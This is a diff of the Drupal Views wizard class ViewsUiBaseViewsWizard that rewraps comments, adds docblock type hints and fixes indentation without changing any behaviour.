@@ -622,9 +629,10 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
     $display_options['style_plugin'] = 'default';
     $display_options['row_plugin'] = 'fields';
 
-    // Add a least one field so the view validates and the user has already a preview.
-    // Therefore the basefield could provide 'defaults][field]' in it's base settings.
-    // If there is nothing like this choose the first field with a field handler.
+    // Add a least one field so the view validates and the user has already a
+    // preview. Therefore the basefield could provide 'defaults][field]' in
+    // it's base settings. If there is nothing like this choose the first field
+    // with a field handler.
     $data = views_fetch_data($this->base_table);
     if (isset($data['table']['base']['defaults']['field'])) {
       $field = $data['table']['base']['defaults']['field'];
@@ -682,8 +690,9 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
         }
       }
       $table_data = views_fetch_data($table);
-      // Check whether the bundle key filter handler is or an child of it views_handler_filter_in_operator
-      // If it's not just use a single value instead of an array.
+      // Check whether the bundle key filter handler is or an child of it
+      // views_handler_filter_in_operator. If it's not just use a single value
+      // instead of an array.
       $handler = $table_data[$bundle_key]['filter']['handler'];
       if ($handler == 'views_handler_filter_in_operator' || is_subclass_of($handler, 'views_handler_filter_in_operator')) {
         $value = drupal_map_assoc(array($form_state['values']['show']['type']));
@@ -700,7 +709,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
       );
     }
 
-    // @todo: Figure out why this isn't part of node_views_wizard.
+    // @todo Figure out why this isn't part of node_views_wizard.
     if (!empty($form_state['values']['show']['tagged_with']['tids'])) {
       $filters['tid'] = array(
         'id' => 'tid',
@@ -741,7 +750,8 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
   protected function default_display_sorts_user($form, $form_state) {
     $sorts = array();
 
-    // Don't add a sort if there is no form value or the user selected none as sort.
+    // Don't add a sort if there is no form value or the user selected none as
+    // sort.
     if (!empty($form_state['values']['show']['sort']) && $form_state['values']['show']['sort'] != 'none') {
       list($column, $sort) = explode(':', $form_state['values']['show']['sort']);
       // Column either be a column-name or the table-columnn-ame.
@@ -826,14 +836,14 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
    * so that new displays which the user adds later will be similar to this
    * one.
    *
-   * @param $options
+   * @param array $options
    *   An array whose keys are the name of each option and whose values are the
    *   desired values to set.
-   * @param $display
+   * @param object $display
    *   The display which the options will be applied to. The default display
    *   will actually be assigned the options (and this display will inherit
    *   them) when possible.
-   * @param $default_display
+   * @param object$default_display
    *   The default display, which will store the options when possible.
    */
   protected function set_default_options($options, $display, $default_display) {
@@ -862,13 +872,13 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
    * the views wizard, then the view will wind up with the title stored as the
    * default (with the page and block both inheriting from it).
    *
-   * @param $options
+   * @param array $options
    *   An array whose keys are the name of each option and whose values are the
    *   desired values.
-   * @param $display
+   * @param object $display
    *   The display which the options will apply to. It will get the options by
    *   inheritance from the default display when possible.
-   * @param $default_display
+   * @param object $default_display
    *   The default display, from which the options will be inherited when
    *   possible.
    */
@@ -918,12 +928,12 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
    *
    * @throws ViewsWizardException if the values have not been validated.
    */
- function create_view($form, &$form_state) {
-   $view = $this->retrieve_validated_view($form, $form_state);
-   if (empty($view)) {
-     throw new ViewsWizardException(t('Attempted to create_view with values that have not been validated'));
-   }
-   return $view;
- }
+  function create_view($form, &$form_state) {
+    $view = $this->retrieve_validated_view($form, $form_state);
+    if (empty($view)) {
+      throw new ViewsWizardException(t('Attempted to create_view with values that have not been validated'));
+    }
+    return $view;
+  }
 
 }
